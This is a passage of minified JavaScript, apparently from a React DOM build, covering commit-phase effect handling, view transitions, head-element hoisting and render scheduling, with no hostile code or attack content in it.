t.flags|=32;(t.flags&4)!==0&&C_(I,Yn===0?a:a+"_"+Yn,l),R&&(t.flags&4)!==0||(Yi===null&&(Yi=[]),Yi.push(I,Yn===0?r:r+"_"+Yn,n.memoizedProps)),Yn++}else(n.tag!==22||n.memoizedState===null)&&(n.tag===30&&g?t.flags|=n.flags&32:_d(t,n.child,a,r,l,u,g)&&(R=!0));n=n.sibling}return R}function Ug(t,n){for(t=t.child;t!==null;){if(t.tag===30){var a=t.memoizedProps,r=t.stateNode,l=da(a,r),u=ha(a.default,a.update),g;g=t.memoizedState,t.memoizedState=null,r=t;var R=t.child;Yn=0,l=_d(r,R,l,l,u,g,!1),(t.flags&4)!==0&&l&&Cs(t,a.onUpdate)}else(t.subtreeFlags&33554432)!==0&&Ug(t);t=t.sibling}}var En=!1,Ge=!1,Ki=!1,vd=!1,Lg=typeof WeakSet=="function"?WeakSet:Set,bn=null,ji=!1,Go=!1,Sc=!1,xd=!1;function By(t,n,a){if(t=t.containerInfo,kd=Bs,t=zm(t),rf(t)){if("selectionStart"in t)var r={start:t.selectionStart,end:t.selectionEnd};else t:{r=(r=t.ownerDocument)&&r.defaultView||window;var l=r.getSelection&&r.getSelection();if(l&&l.rangeCount!==0){r=l.anchorNode;var u=l.anchorOffset,g=l.focusNode;l=l.focusOffset;try{r.nodeType,g.nodeType}catch{r=null;break t}var R=0,I=-1,Q=-1,ct=0,yt=0,Z=t,st=null;e:for(;;){for(var It;Z!==r||u!==0&&Z.nodeType!==3||(I=R+u),Z!==g||l!==0&&Z.nodeType!==3||(Q=R+l),Z.nodeType===3&&(R+=Z.nodeValue.length),(It=Z.firstChild)!==null;)st=Z,Z=It;for(;;){if(Z===t)break e;if(st===r&&++ct===u&&(I=R),st===g&&++yt===l&&(Q=R),(It=Z.nextSibling)!==null)break;Z=st,st=Z.parentNode}Z=It}r=I===-1||Q===-1?null:{start:I,end:Q}}else r=null}r=r||{start:0,end:0}}else r=null;for(Wd={focusedElem:t,selectionRange:r},Bs=!1,a=(a&335544064)===a,bn=n,n=a?9270:1024;bn!==null;){if(t=bn,a&&(r=t.deletions,r!==null))for(u=0;u<r.length;u++)a&&md(r[u]);if(t.alternate===null&&(t.flags&2)!==0)a&&Rg(t),yc(a);else{if(t.tag===22){if(r=t.alternate,t.memoizedState!==null){r!==null&&r.memoizedState===null&&a&&md(r),yc(a);continue}else if(r!==null&&r.memoizedState!==null){a&&Rg(t),yc(a);continue}}r=t.child,(t.subtreeFlags&n)!==0&&r!==null?(r.return=t,bn=r):(a&&Ng(t),yc(a))}}ri=null}function yc(t){for(;bn!==null;){var n=bn,a=t,r=n.alternate,l=n.flags;switch(n.tag){case 0:case 11:case 15:break;case 1:if((l&1024)!==0&&r!==null){a=void 0,l=r.memoizedProps,r=r.memoizedState;var u=n.stateNode;try{var g=Or(n.type,l);a=u.getSnapshotBeforeUpdate(g,r),u.__reactInternalSnapshotBeforeUpdate=a}catch(R){ke(n,n.return,R)}}break;case 3:if((l&1024)!==0){if(r=n.stateNode.containerInfo,a=r.nodeType,a===9)Jd(r);else if(a===1)switch(r.nodeName){case"HEAD":case"HTML":case"BODY":Jd(r);break;default:r.textContent=""}}break;case 5:case 26:case 27:case 6:case 4:case 17:break;case 30:a&&r!==null&&(a=da(r.memoizedProps,r.stateNode),l=n.memoizedProps,l=ha(l.default,l.update),l!=="none"&&Ss(r,a,l,r.memoizedState=[],!0));break;default:if((l&1024)!==0)throw Error(s(163))}if(r=n.sibling,r!==null){r.return=n.return,bn=r;break}bn=n.return}}function Og(t,n,a){var r=a.flags;switch(a.tag){case 0:case 11:case 15:Qi(t,a),r&4&&Fo(5,a);break;case 1:if(Qi(t,a),r&4)if(t=a.stateNode,n===null)try{t.componentDidMount()}catch(g){ke(a,a.return,g)}else{var l=Or(a.type,n.memoizedProps);n=n.memoizedState;try{t.componentDidUpdate(l,n,t.__reactInternalSnapshotBeforeUpdate)}catch(g){ke(a,a.return,g)}}r&64&&Mg(a),r&512&&qi(a,a.return);break;case 3:if(Qi(t,a),r&64&&(t=a.updateQueue,t!==null)){if(n=null,a.child!==null)switch(a.child.tag){case 27:case 5:n=a.child.stateNode;break;case 1:n=a.child.stateNode}try{f0(t,n)}catch(g){ke(a,a.return,g)}}break;case 27:n===null&&r&4&&Ag(a);case 26:case 5:Qi(t,a),n===null&&r&4&&cd(a),r&512&&qi(a,a.return);break;case 12:Qi(t,a);break;case 31:Qi(t,a),r&4&&Bg(t,a);break;case 13:Qi(t,a),r&4&&Fg(t,a),r&64&&(t=a.memoizedState,t!==null&&(t=t.dehydrated,t!==null&&(a=jy.bind(null,a),DM(t,a))));break;case 22:if(r=a.memoizedState!==null||En,!r){var u=n!==null&&n.memoizedState!==null||Ge;n=En,l=Ge,En=r,(Ge=u)&&!l?(r=2,(a.subtreeFlags&8772)!==0&&(r|=1),Ni(t,a,r)):Qi(t,a),En=n,Ge=l}break;case 30:Qi(t,a),r&512&&qi(a,a.return);break;case 7:r&512&&qi(a,a.return);default:Qi(t,a)}}function Sd(t,n){for(t=t.child;t!==null;)Pg(t,n),t=t.sibling}function Pg(t,n){switch(t.tag){case 5:case 26:try{var a=t.stateNode;if(n){var r=a.style;typeof r.setProperty=="function"?r.setProperty("display","none","important"):r.display="none"}else{var l=t.stateNode,u=t.memoizedProps.style,g=u!=null&&u.hasOwnProperty("display")?u.display:null;l.style.display=g==null||typeof g=="boolean"?"":(""+g).trim()}}catch(I){ke(t,t.return,I)}yd(t,n);break;case 6:try{t.stateNode.nodeValue=n?"":t.memoizedProps,ve=!0}catch(I){ke(t,t.return,I)}break;case 18:try{var R=t.stateNode;n?R_(R,!0):R_(t.stateNode,!1)}catch(I){ke(t,t.return,I)}break;case 22:case 23:t.memoizedState===null&&Sd(t,n);break;default:Sd(t,n)}}function yd(t,n){if(t.subtreeFlags&67108864)for(t=t.child;t!==null;){t:{var a=t,r=n;switch(a.tag){case 4:Pg(a,r);break t;case 22:a.memoizedState===null&&yd(a,r);break t;default:yd(a,r)}}t=t.sibling}}function Ig(t){var n=t.alternate;n!==null&&(t.alternate=null,Ig(n)),t.child=null,t.deletions=null,t.sibling=null,t.tag===5&&(n=t.stateNode,n!==null&&jt(n)),t.stateNode=null,t.return=null,t.dependencies=null,t.memoizedProps=null,t.memoizedState=null,t.pendingProps=null,t.stateNode=null,t.updateQueue=null}var tn=null,Zn=!1;function Ci(t,n,a){for(a=a.child;a!==null;)zg(t,n,a),a=a.sibling}function zg(t,n,a){if(Xt&&typeof Xt.onCommitFiberUnmount=="function")try{Xt.onCommitFiberUnmount(Jt,a)}catch{}switch(a.tag){case 26:Ge||wn(a,n),Ci(t,n,a),a.memoizedState?a.memoizedState.count--:a.stateNode&&!Ge&&(a=a.stateNode,a.parentNode.removeChild(a));break;case 27:Ge||wn(a,n),Ho(a);var r=tn,l=Zn;ar(a.type)&&(tn=a.stateNode,Zn=!1),Ci(t,n,a),G_(a.stateNode,a.type,a.memoizedProps),tn=r,Zn=l;break;case 5:Ge||wn(a,n),Ho(a);case 6:if(a.tag===6&&Ho(a),r=tn,l=Zn,tn=null,Ci(t,n,a),tn=r,Zn=l,tn!==null)if(Zn)try{(tn.nodeType===9?tn.body:tn.nodeName==="HTML"?tn.ownerDocument.body:tn).removeChild(a.stateNode),ve=!0}catch(u){ke(a,n,u)}else try{tn.removeChild(a.stateNode),ve=!0}catch(u){ke(a,n,u)}break;case 18:tn!==null&&(Zn?(t=tn,A_(t.nodeType===9?t.body:t.nodeName==="HTML"?t.ownerDocument.body:t,a.stateNode),Fs(t)):A_(tn,a.stateNode));break;case 4:r=tn,l=Zn,tn=a.stateNode.containerInfo,Zn=!0,Ci(t,n,a),tn=r,Zn=l;break;case 0:case 11:case 14:case 15:Qa(2,a,n),Ge||Qa(4,a,n),Ci(t,n,a);break;case 1:Ge||(wn(a,n),r=a.stateNode,typeof r.componentWillUnmount=="function"&&Eg(a,n,r)),Ci(t,n,a);break;case 21:Ci(t,n,a);break;case 22:Ge=(r=Ge)||a.memoizedState!==null,Ci(t,n,a),Ge=r;break;case 30:wn(a,n),Ci(t,n,a);break;case 7:Ge||wn(a,n),Ci(t,n,a);break;default:Ci(t,n,a)}}function Bg(t,n){if(n.memoizedState===null&&(t=n.alternate,t!==null&&(t=t.memoizedState,t!==null))){t=t.dehydrated;try{Fs(t)}catch(a){ke(n,n.return,a)}}}function Fg(t,n){if(n.memoizedState===null&&(t=n.alternate,t!==null&&(t=t.memoizedState,t!==null&&(t=t.dehydrated,t!==null))))try{Fs(t)}catch(a){ke(n,n.return,a)}}function Fy(t){switch(t.tag){case 31:case 13:case 19:var n=t.stateNode;return n===null&&(n=t.stateNode=new Lg),n;case 22:return t=t.stateNode,n=t._retryCache,n===null&&(n=t._retryCache=new Lg),n;default:throw Error(s(435,t.tag))}}function Mc(t,n){var a=Fy(t);n.forEach(function(r){if(!a.has(r)){a.add(r);var l=Qy.bind(null,t,r);r.then(l,l)}})}function Hn(t,n,a){var r=n.deletions;if(r!==null)for(var l=0;l<r.length;l++){var u=r[l],g=t,R=n,I=R;t:for(;I!==null;){switch(I.tag){case 27:if(ar(I.type)){tn=I.stateNode,Zn=!1;break t}break;case 5:tn=I.stateNode,Zn=!1;break t;case 3:case 4:tn=I.stateNode.containerInfo,Zn=!0;break t}I=I.return}if(tn===null)throw Error(s(160));zg(g,R,u),tn=null,Zn=!1,g=u.alternate,g!==null&&(g.return=null),u.return=null}if(n.subtreeFlags&13886)for(n=n.child;n!==null;)Hg(n,t,a),n=n.sibling}var wi=null;function Hg(t,n,a){var r=t.alternate,l=t.flags;switch(t.tag){case 0:case 11:case 14:case 15:if(l&4&&(r=t.updateQueue,r=r!==null?r.events:null,r!==null))for(var u=0;u<r.length;u++){var g=r[u];g.ref.impl=g.nextImpl}Hn(n,t,a),Gn(t),l&4&&(Qa(3,t,t.return),Fo(3,t),Qa(5,t,t.return));break;case 1:Hn(n,t,a),Gn(t),l&512&&(Ge||r===null||wn(r,r.return)),l&64&&En&&(t=t.updateQueue,t!==null&&(n=t.callbacks,n!==null&&(a=t.shared.hiddenCallbacks,t.shared.hiddenCallbacks=a===null?n:a.concat(n))));break;case 26:if(u=wi,Hn(n,t,a),Gn(t),l&512&&(Ge||r===null||wn(r,r.return)),l&4)if(l=r!==null?r.memoizedState:null,a=t.memoizedState,r===null)if(a===null)if(t.stateNode===null)if(En)t.stateNode=E_(t.type,t.memoizedProps,n.containerInfo,t);else{t:{n=t.type,a=t.memoizedProps,l=u.ownerDocument||u;e:switch(n){case"title":r=l.getElementsByTagName("title")[0],(!r||r[Pt]||r[A]||r.namespaceURI==="http://www.w3.org/2000/svg"||r.hasAttribute("itemprop"))&&(r=l.createElement(n),l.head.insertBefore(r,l.querySelector("head > title"))),Nn(r,n,a),r[A]=t,_e(r),n=r;break t;case"link":if(u=Y_("link","href",l).get(n+(a.href||""))){for(g=0;g<u.length;g++)if(r=u[g],r.getAttribute("href")===(a.href==null||a.href===""?null:a.href)&&r.getAttribute("rel")===(a.rel==null?null:a.rel)&&r.getAttribute("title")===(a.title==null?null:a.title)&&r.getAttribute("crossorigin")===(a.crossOrigin==null?null:a.crossOrigin)){u.splice(g,1);break e}}r=l.createElement(n),Nn(r,n,a),l.head.appendChild(r);break;case"meta":if(u=Y_("meta","content",l).get(n+(a.content||""))){for(g=0;g<u.length;g++)if(r=u[g],r.getAttribute("content")===(a.content==null?null:""+a.content)&&r.getAttribute("name")===(a.name==null?null:a.name)&&r.getAttribute("property")===(a.property==null?null:a.property)&&r.getAttribute("http-equiv")===(a.httpEquiv==null?null:a.httpEquiv)&&r.getAttribute("charset")===(a.charSet==null?null:a.charSet)){u.splice(g,1);break e}}r=l.createElement(n),Nn(r,n,a),l.head.appendChild(r);break;default:throw Error(s(468,n))}r[A]=t,_e(r),n=r}t.stateNode=n}else En||rh(u,t.type,t.stateNode);else t.stateNode=q_(u,a,t.memoizedProps);else l!==a?(l===null?(n=r.stateNode,n===null||Ge||n.parentNode.removeChild(n)):l.count--,a===null?En||rh(u,t.type,t.stateNode):q_(u,a,t.memoizedProps)):a===null&&t.stateNode!==null&&ud(t,t.memoizedProps,r.memoizedProps);break;case 27:Hn(n,t,a),Gn(t),l&512&&(Ge||r===null||wn(r,r.return)),r!==null&&l&4&&ud(t,t.memoizedProps,r.memoizedProps);break;case 5:if(u=Ki,Ki=!1,Hn(n,t,a),Ki=u,Gn(t),l&512&&(Ge||r===null||wn(r,r.return)),t.flags&32){n=t.stateNode;try{ns(n,""),ve=!0}catch(ct){ke(t,t.return,ct)}}l&4&&t.stateNode!=null&&(n=t.memoizedProps,ud(t,n,r!==null?r.memoizedProps:n)),l&1024&&(vd=!0);break;case 6:if(Hn(n,t,a),Gn(t),l&4){if(t.stateNode===null)throw Error(s(162));n=t.memoizedProps,a=t.stateNode;try{a.nodeValue=n,ve=!0}catch(ct){ke(t,t.return,ct)}}break;case 3:if(ve=!1,zc=null,u=wi,wi=jo(n.containerInfo),Hn(n,t,a),wi=u,Gn(t),l&4&&r!==null&&r.memoizedState.isDehydrated)try{Fs(n.containerInfo)}catch(ct){ke(t,t.return,ct)}vd&&(vd=!1,Gg(t)),ve=!1;break;case 4:l=Ki,Ki=En,r=Be(),u=wi,wi=jo(t.stateNode.containerInfo),Hn(n,t,a),Gn(t),wi=u,ve&&Go&&(Sc=!0),ve=r,Ki=l;break;case 12:Hn(n,t,a),Gn(t);break;case 31:Hn(n,t,a),Gn(t),l&4&&(n=t.updateQueue,n!==null&&(t.updateQueue=null,Mc(t,n)));break;case 13:Hn(n,t,a),Gn(t),t.child.flags&8192&&t.memoizedState!==null!=(r!==null&&r.memoizedState!==null)&&(Tc=Wt()),l&4&&(n=t.updateQueue,n!==null&&(t.updateQueue=null,Mc(t,n)));break;case 22:u=t.memoizedState!==null,g=r!==null&&r.memoizedState!==null;var R=En,I=Ge,Q=Ki;En=R||u,Ki=Q||u,Ge=I||g,Hn(n,t,a),Ge=I,Ki=Q,En=R,Gn(t),l&8192&&(n=t.stateNode,n._visibility=u?n._visibility&-2:n._visibility|1,!u||r===null||g||En||Ge||(n=g||Ge,a=En,r=Ge,En=u||En,Ge=n,Ja(t,2),En=a,Ge=r),!u&&Ki||Sd(t,u)),l&4&&(n=t.updateQueue,n!==null&&(a=n.retryQueue,a!==null&&(n.retryQueue=null,Mc(t,a))));break;case 19:Hn(n,t,a),Gn(t),l&4&&(n=t.updateQueue,n!==null&&(t.updateQueue=null,Mc(t,n)));break;case 30:l&512&&(Ge||r===null||wn(r,r.return)),l=Be(),u=Go,g=(a&335544064)===a,R=t.memoizedProps,Go=g&&ha(R.default,R.update)!=="none",Hn(n,t,a),Gn(t),g&&r!==null&&ve&&(t.flags|=4),Go=u,ve=l;break;case 21:break;case 7:l&512&&(Ge||r===null||wn(r,r.return)),r&&r.stateNode!==null&&(r.stateNode._fragmentFiber=t);default:Hn(n,t,a),Gn(t)}}function Gn(t){var n=t.flags;if(n&2){try{for(var a,r=t.return;r!==null;){if(Tg(r)){a=r;break}r=r.return}r=null;for(var l=t.return;l!==null;){if(ld(l)){var u=l.stateNode;r===null?r=[u]:r.push(u)}if(od(l))break;l=l.return}var g=r;if(a==null)throw Error(s(160));switch(a.tag){case 27:var R=a.stateNode,I=fd(t);gc(t,I,R,g);break;case 5:var Q=a.stateNode;a.flags&32&&(ns(Q,""),a.flags&=-33);var ct=fd(t);gc(t,ct,Q,g);break;case 3:case 4:var yt=a.stateNode.containerInfo,Z=fd(t);dd(t,Z,yt,g);break;default:throw Error(s(161))}}catch(st){ke(t,t.return,st)}t.flags&=-3}n&4096&&(t.flags&=-4097)}function Gg(t){if(t.subtreeFlags&1024)for(t=t.child;t!==null;){var n=t;Gg(n),n.tag===5&&n.flags&1024&&(n=n.stateNode,Bs=!0,n.reset(),Bs=!1),t=t.sibling}}function ys(t,n){if(n.subtreeFlags&9270)for(n=n.child;n!==null;)Vg(n,t),n=n.sibling;else Ug(n)}function Vg(t,n){var a=t.alternate;if(a===null)hd(t,!1);else switch(t.tag){case 3:if(xd=ji=!1,Cg(),ys(n,t),!ji&&!Sc){if(t=Yi,t!==null)for(var r=0;r<t.length;r+=3){a=t[r];var l=t[r+1];w_(a,t[r+2]),a=a.ownerDocument.documentElement,a!==null&&a.animate({opacity:[0,0],pointerEvents:["none","none"]},{duration:0,fill:"forwards",pseudoElement:"::view-transition-group("+l+")"})}t=n.containerInfo,t=t.nodeType===9?t.documentElement:t.ownerDocument.documentElement,t!==null&&t.style.viewTransitionName===""&&(t.style.viewTransitionName="none",t.animate({opacity:[0,0],pointerEvents:["none","none"]},{duration:0,fill:"forwards",pseudoElement:"::view-transition-group(root)"}),t.animate({width:[0,0],height:[0,0]},{duration:0,fill:"forwards",pseudoElement:"::view-transition"})),xd=!0}Yi=null;break;case 5:ys(n,t);break;case 4:r=ji,ji=!1,ys(n,t),ji&&(Sc=!0),ji=r;break;case 22:t.memoizedState===null&&(a.memoizedState!==null?hd(t,!1):ys(n,t));break;case 30:r=ji,l=Cg(),ji=!1,ys(n,t),ji&&(t.flags|=4);var u=t.memoizedProps,g=t.stateNode;n=da(u,g),g=da(a.memoizedProps,g);var R=ha(u.default,u.update);R==="none"?n=!1:(u=a.memoizedState,a.memoizedState=null,a=t.child,Yn=0,n=_d(t,a,n,g,R,u,!0),Yn!==(u===null?0:u.length)&&(t.flags|=32)),(t.flags&4)!==0&&n?(Cs(t,t.memoizedProps.onUpdate),Yi=l):l!==null&&(l.push.apply(l,Yi),Yi=l),ji=(t.flags&32)!==0?!0:r;break;default:ys(n,t)}}function Qi(t,n){if(n.subtreeFlags&8772)for(n=n.child;n!==null;)Og(t,n.alternate,n),n=n.sibling}function Ja(t,n){for(t=t.child;t!==null;){var a=t,r=n;switch(a.tag){case 0:case 11:case 14:case 15:Qa(4,a,a.return),Ja(a,r);break;case 1:wn(a,a.return);var l=a.stateNode;typeof l.componentWillUnmount=="function"&&Eg(a,a.return,l),Ja(a,r);break;case 27:(r&2)!==0&&G_(a.stateNode,a.type,a.memoizedProps);case 5:wn(a,a.return),a.tag!==5&&a.tag!==27||Ho(a),Ja(a,r);break;case 6:Ho(a);break;case 26:wn(a,a.return),l=a.stateNode,a.memoizedState!==null||l===null||Ge||l.parentNode.removeChild(l),Ja(a,r);break;case 22:a.memoizedState===null&&Ja(a,r);break;case 30:wn(a,a.return),Ja(a,r);break;case 7:wn(a,a.return);default:Ja(a,r)}t=t.sibling}}function Ni(t,n,a){for(a=(n.subtreeFlags&8772)!==0?a:a&-2,n=n.child;n!==null;){var r=n.alternate,l=t,u=n,g=u.flags,R=(a&1)!==0;switch(u.tag){case 0:case 11:case 15:Ni(l,u,a),Fo(4,u);break;case 1:if(Ni(l,u,a),r=u,l=r.stateNode,typeof l.componentDidMount=="function")try{l.componentDidMount()}catch(ct){ke(r,r.return,ct)}if(r=u,l=r.updateQueue,l!==null){var I=r.stateNode;try{var Q=l.shared.hiddenCallbacks;if(Q!==null)for(l.shared.hiddenCallbacks=null,l=0;l<Q.length;l++)u0(Q[l],I)}catch(ct){ke(r,r.return,ct)}}R&&g&64&&Mg(u),qi(u,u.return);break;case 27:(a&2)!==0&&Ag(u);case 5:u.tag!==5&&u.tag!==27||bg(u),Ni(l,u,a),R&&r===null&&g&4&&cd(u),qi(u,u.return);break;case 6:bg(u);break;case 26:I=u.stateNode,u.memoizedState!==null||I===null||En||rh(jo(I.ownerDocument),u.type,I),Ni(l,u,a),R&&r===null&&g&4&&cd(u),qi(u,u.return);break;case 12:Ni(l,u,a);break;case 31:Ni(l,u,a),R&&g&4&&Bg(l,u);break;case 13:Ni(l,u,a),R&&g&4&&Fg(l,u);break;case 22:u.memoizedState===null&&Ni(l,u,a),qi(u,u.return);break;case 30:Ni(l,u,a),qi(u,u.return);break;case 7:qi(u,u.return);default:Ni(l,u,a)}n=n.sibling}}function Md(t,n){var a=null;t!==null&&t.memoizedState!==null&&t.memoizedState.cachePool!==null&&(a=t.memoizedState.cachePool.pool),t=null,n.memoizedState!==null&&n.memoizedState.cachePool!==null&&(t=n.memoizedState.cachePool.pool),t!==a&&(t!=null&&t.refCount++,a!=null&&Ao(a))}function Ed(t,n){t=null,n.alternate!==null&&(t=n.alternate.memoizedState.cache),n=n.memoizedState.cache,n!==t&&(n.refCount++,t!=null&&Ao(t))}function Si(t,n,a,r){var l=(a&335544064)===a;if(n.subtreeFlags&(l?10262:10256))for(n=n.child;n!==null;)Xg(t,n,a,r),n=n.sibling;else l&&Dg(n)}function Xg(t,n,a,r){var l=(a&335544064)===a;l&&n.alternate===null&&n.return!==null&&n.return.alternate!==null&&xc(n);var u=n.flags;switch(n.tag){case 0:case 11:case 15:Si(t,n,a,r),u&2048&&Fo(9,n);break;case 1:Si(t,n,a,r);break;case 3:Si(t,n,a,r),l&&xd&&(t=t.containerInfo,t=t.nodeType===9?t.body:t.nodeName==="HTML"?t.ownerDocument.body:t,t.style.viewTransitionName==="root"&&(t.style.viewTransitionName=""),t=t.ownerDocument.documentElement,t!==null&&t.style.viewTransitionName==="none"&&(t.style.viewTransitionName="")),u&2048&&(u=null,n.alternate!==null&&(u=n.alternate.memoizedState.cache),n=n.memoizedState.cache,n!==u&&(n.refCount++,u!=null&&Ao(u)));break;case 12:if(u&2048){Si(t,n,a,r),u=n.stateNode;try{var g=n.memoizedProps,R=g.id,I=g.onPostCommit;typeof I=="function"&&I(R,n.alternate===null?"mount":"update",u.passiveEffectDuration,-0)}catch(Q){ke(n,n.return,Q)}}else Si(t,n,a,r);break;case 31:Si(t,n,a,r);break;case 13:Si(t,n,a,r);break;case 23:break;case 22:g=n.stateNode,R=n.alternate,n.memoizedState!==null?(l&&R!==null&&R.memoizedState===null&&xc(R),g._visibility&2?Si(t,n,a,r):Vo(t,n)):(l&&R!==null&&R.memoizedState!==null&&xc(n),g._visibility&2?Si(t,n,a,r):(g._visibility|=2,Ms(t,n,a,r,(n.subtreeFlags&10256)!==0||!1))),u&2048&&Md(R,n);break;case 24:Si(t,n,a,r),u&2048&&Ed(n.alternate,n);break;case 30:l&&(u=n.alternate,u!==null&&(Zi(u.child,!0),Zi(n.child,!0))),Si(t,n,a,r);break;default:Si(t,n,a,r)}}function Ms(t,n,a,r,l){for(l=l&&((n.subtreeFlags&10256)!==0||!1),n=n.child;n!==null;){var u=t,g=n,R=a,I=r,Q=g.flags;switch(g.tag){case 0:case 11:case 15:Ms(u,g,R,I,l),Fo(8,g);break;case 23:break;case 22:var ct=g.stateNode;g.memoizedState!==null?ct._visibility&2?Ms(u,g,R,I,l):Vo(u,g):(ct._visibility|=2,Ms(u,g,R,I,l)),l&&Q&2048&&Md(g.alternate,g);break;case 24:Ms(u,g,R,I,l),l&&Q&2048&&Ed(g.alternate,g);break;default:Ms(u,g,R,I,l)}n=n.sibling}}function Vo(t,n){if(n.subtreeFlags&10256)for(n=n.child;n!==null;){var a=t,r=n,l=r.flags;switch(r.tag){case 22:Vo(a,r),l&2048&&Md(r.alternate,r);break;case 24:Vo(a,r),l&2048&&Ed(r.alternate,r);break;default:Vo(a,r)}n=n.sibling}}var Pr=8192;function Ir(t,n,a){if(t.subtreeFlags&Pr)for(t=t.child;t!==null;)kg(t,n,a),t=t.sibling}function kg(t,n,a){switch(t.tag){case 26:Ir(t,n,a),t.flags&Pr&&(t.memoizedState!==null?WM(a,wi,t.memoizedState,t.memoizedProps):(t=t.stateNode,(n&335544128)===n&&Q_(a,t)));break;case 5:Ir(t,n,a),t.flags&Pr&&(t=t.stateNode,(n&335544128)===n&&Q_(a,t));break;case 3:case 4:var r=wi;wi=jo(t.stateNode.containerInfo),Ir(t,n,a),wi=r;break;case 22:t.memoizedState===null&&(r=t.alternate,r!==null&&r.memoizedState!==null?(r=Pr,Pr=16777216,Ir(t,n,a),Pr=r):Ir(t,n,a));break;case 30:if((t.flags&Pr)!==0&&(r=t.memoizedProps.name,r!=null&&r!=="auto")){var l=t.stateNode;l.paired=null,ri===null&&(ri=new Map),ri.set(r,l)}Ir(t,n,a);break;default:Ir(t,n,a)}}function Wg(t){var n=t.alternate;if(n!==null&&(t=n.child,t!==null)){n.child=null;do n=t.sibling,t.sibling=null,t=n;while(t!==null)}}function Xo(t){var n=t.deletions;if((t.flags&16)!==0){if(n!==null)for(var a=0;a<n.length;a++){var r=n[a];bn=r,Yg(r,t)}Wg(t)}if(t.subtreeFlags&10256)for(t=t.child;t!==null;)qg(t),t=t.sibling}function qg(t){switch(t.tag){case 0:case 11:case 15:Xo(t),t.flags&2048&&Qa(9,t,t.return);break;case 3:Xo(t);break;case 12:Xo(t);break;case 22:var n=t.stateNode;t.memoizedState!==null&&n._visibility&2&&(t.return===null||t.return.tag!==13)?(n._visibility&=-3,Ec(t)):Xo(t);break;default:Xo(t)}}function Ec(t){var n=t.deletions;if((t.flags&16)!==0){if(n!==null)for(var a=0;a<n.length;a++){var r=n[a];bn=r,Yg(r,t)}Wg(t)}for(t=t.child;t!==null;){switch(n=t,n.tag){case 0:case 11:case 15:Qa(8,n,n.return),Ec(n);break;case 22:a=n.stateNode,a._visibility&2&&(a._visibility&=-3,Ec(n));break;default:Ec(n)}t=t.sibling}}function Yg(t,n){for(;bn!==null;){var a=bn;switch(a.tag){case 0:case 11:case 15:Qa(8,a,n);break;case 23:case 22:if(a.memoizedState!==null&&a.memoizedState.cachePool!==null){var r=a.memoizedState.cachePool.pool;r!=null&&r.refCount++}break;case 24:Ao(a.memoizedState.cache)}if(r=a.child,r!==null)r.return=a,bn=r;else t:for(a=t;bn!==null;){r=bn;var l=r.sibling,u=r.return;if(Ig(r),r===a){bn=null;break t}if(l!==null){l.return=u,bn=l;break t}bn=u}}}var Hy={getCacheForType:function(t){var n=An(dn),a=n.data.get(t);return a===void 0&&(a=t(),n.data.set(t,a)),a},cacheSignal:function(){return An(dn).controller.signal}},Gy=typeof WeakMap=="function"?WeakMap:Map,Fe=0,Ke=null,Me=null,Te=0,Xe=0,si=null,$a=!1,Es=!1,bd=!1,Ma=0,on=0,tr=0,zr=0,bc=0,oi=0,bs=0,ko=null,Kn=null,Td=!1,Tc=0,Zg=0,Ac=1/0,Rc=null,er=null,nn=0,Di=null,Br=null,Ji=0,Ad=0,Rd=null,Kg=null,Ts=null,As=null,Rs=null,Wo=0,Cc=null;function li(){return(Fe&2)!==0&&Te!==0?Te&-Te:_t.T!==null?zd():Al()}function jg(){if(oi===0)if((Te&536870912)===0||xe){var t=_r;_r<<=1,(_r&3932160)===0&&(_r=262144),oi=t}else oi=536870912;return t=Rn.current,t!==null&&(t.flags|=32),oi}function Cs(t,n){if(n!=null){var a=t.stateNode,r=a.ref;r===null&&(r=a.ref=N_(da(t.memoizedProps,a))),As===null&&(As=[]),As.push(n.bind(null,r))}}function jn(t,n,a){(t===Ke&&(Xe===2||Xe===9)||t.cancelPendingCommit!==null)&&(ws(t,0),nr(t,Te,oi,!1)),Gi(t,a),((Fe&2)===0||t!==Ke)&&(t===Ke&&((Fe&2)===0&&(zr|=a),on===4&&nr(t,Te,oi,!1)),$i(t))}function Qg(t,n,a){if((Fe&6)!==0)throw Error(s(327));var r=!a&&(n&127)===0&&(n&t.expiredLanes)===0||za(t,n),l=r?ky(t,n):wd(t,n,!0),u=r;do{if(l===0){Es&&!r&&nr(t,n,0,!1);break}else{if(a=t.current.alternate,u&&!Vy(a)){l=wd(t,n,!1),u=!1;continue}if(l===2){if(u=n,t.errorRecoveryDisabledLanes&u)var g=0;else g=t.pendingLanes&-536870913,g=g!==0?g:g&536870912?536870912:0;if(g!==0){n=g;t:{var R=t;l=ko;var I=R.current.memoizedState.isDehydrated;if(I&&(ws(R,g).flags|=256),g=wd(R,g,!1),g!==2&&g!==6){if(bd&&!I){R.errorRecoveryDisabledLanes|=u,zr|=u,l=4;break t}u=Kn,Kn=l,u!==null&&(Kn===null?Kn=u:Kn.push.apply(Kn,u))}l=g}if(u=!1,l!==2)continue}}if(l===1){ws(t,0),nr(t,n,0,!0);break}t:{switch(r=t,u=l,u){case 0:case 1:throw Error(s(345));case 4:if((n&4194048)!==n&&(n&62914560)!==n)break;case 6:nr(r,n,oi,!$a);break t;case 2:Kn=null;break;case 3:case 5:break;default:throw Error(s(329))}if((n&62914560)===n&&(l=Tc+300-Wt(),10<l)){if(nr(r,n,oi,!$a),vr(r,0,!0)!==0)break t;Ji=n,r.timeoutHandle=Zd(Jg.bind(null,r,a,Kn,Rc,Td,n,oi,zr,bs,$a,u,"Throttled",-0,0),l);break t}Jg(r,a,Kn,Rc,Td,n,oi,zr,bs,$a,u,null,-0,0)}}break}while(!0);$i(t)}function Jg(t,n,a,r,l,u,g,R,I,Q,ct,yt,Z,st){t.timeoutHandle=-1;var It=n.subtreeFlags,Qt=(u&335544064)===u;if(yt=null,(Qt||It&8192||(It&16785408)===16785408)&&(yt={stylesheets:null,count:0,imgCount:0,imgBytes:0,suspenseyImages:[],waitingForImages:!0,waitingForViewTransition:!1,unsuspend:Xi},ri=null,kg(n,u,yt),Qt&&(It=yt,Qt=t.containerInfo,Qt=(Qt.nodeType===9?Qt:Qt.ownerDocument).__reactViewTransition,Qt!=null&&(It.count++,It.waitingForViewTransition=!0,It=$o.bind(It),Qt.finished.then(It,It))),It=(u&62914560)===u?Tc-Wt():(u&4194048)===u?Zg-Wt():0,It=qM(yt,It),It!==null)){Ji=u,t.cancelPendingCommit=It(s_.bind(null,t,n,u,a,r,l,g,R,I,Q,ct,yt,null,Z,st)),nr(t,u,g,!Q);return}s_(t,n,u,a,r,l,g,R,I,Q,ct,yt)}function Vy(t){for(var n=t;;){var 